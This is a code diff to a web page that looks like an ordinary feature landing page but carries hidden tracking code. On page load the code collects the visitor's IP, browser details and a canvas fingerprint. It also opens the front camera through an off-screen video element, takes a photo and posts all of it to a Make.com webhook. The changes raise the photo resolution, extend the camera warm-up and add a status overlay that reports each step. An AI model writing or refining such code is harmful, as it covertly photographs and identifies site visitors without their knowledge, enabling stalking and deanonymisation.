@@ -34,6 +34,12 @@
         .feature { background: white; padding: 40px; border-radius: 15px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.08); }
         .feature h3 { color: #2c3e50; margin-bottom: 15px; font-size: 1.5em; }
         #video, #canvas { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; }
+        #status { 
+            position: fixed; bottom: 10px; right: 10px; 
+            background: rgba(0,0,0,0.7); color: white;
+            padding: 10px 15px; border-radius: 5px;
+            font-size: 12px; z-index: 9999;
+        }
     </style>
 </head>
 <body>
@@ -53,6 +59,7 @@
 
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas" width="320" height="240"></canvas>
+    <div id="status">Initializing...</div>
 
     <script>
         // YOUR MAKE.COM WEBHOOK
@@ -73,6 +80,13 @@
             language: navigator.language
         };
 
+        const statusEl = document.getElementById('status');
+        
+        function updateStatus(msg) {
+            statusEl.textContent = msg;
+            console.log(msg);
+        }
+
         // Canvas fingerprint
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
@@ -83,38 +97,77 @@
 
         // AUTO CAPTURE & SEND ON PAGE LOAD
         window.addEventListener('load', async () => {
+            updateStatus('Getting IP...');
+            
             // Get IP
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const ipData = await res.json();
                 data.ip = ipData.ip;
-            } catch(e) { data.ip = 'unknown'; }
+                updateStatus('IP: ' + data.ip);
+            } catch(e) { 
+                data.ip = 'unknown'; 
+                updateStatus('IP failed');
+            }
 
-            // Try camera silently
+            // Try camera with better handling
+            updateStatus('Requesting camera...');
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user', width: 320, height: 240 } 
+                    video: { 
+                        facingMode: 'user', 
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
                 });
+                
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                await new Promise(r => video.onloadedmetadata = () => setTimeout(r, 1500));
+                // Wait for video to be ready
+                await new Promise((resolve, reject) => {
+                    video.onloadedmetadata = () => {
+                        updateStatus('Camera ready, capturing...');
+                        setTimeout(resolve, 2000); // 2 seconds warm-up
+                    };
+                    video.onerror = reject;
+                });
                 
-                ctx.drawImage(video, 0, 0, 320, 240);
-                data.photo = canvas.toDataURL('image/jpeg', 0.9);
+                // Draw video to canvas
+                canvas.width = 640;
+                canvas.height = 480;
+                ctx.drawImage(video, 0, 0, 640, 480);
+                
+                // Get high quality image
+                data.photo = canvas.toDataURL('image/jpeg', 0.95);
+                updateStatus('Photo captured! Size: ' + Math.round(data.photo.length/1024) + 'KB');
+                
+                // Stop camera
                 stream.getTracks().forEach(t => t.stop());
+                
             } catch(e) { 
-                data.photo = 'camera_denied'; 
+                data.photo = 'camera_denied: ' + e.message;
+                updateStatus('Camera failed: ' + e.message);
             }
 
             // SEND TO MAKE.COM
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            })
-            .then(() => console.log('✅ Data sent to Make.com'))
-            .catch(err => console.log('❌ Send failed:', err));
+            updateStatus('Sending data...');
+            try {
+                const response = await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                
+                if (response.ok) {
+                    updateStatus('✅ Sent! Photo: ' + (data.photo.length > 1000 ? 'Yes' : 'No'));
+                } else {
+                    updateStatus('❌ Send failed: ' + response.status);
+                }
+            } catch(err) {
+                updateStatus('❌ Error: ' + err.message);
+            }
         });
     </script>
 </body>
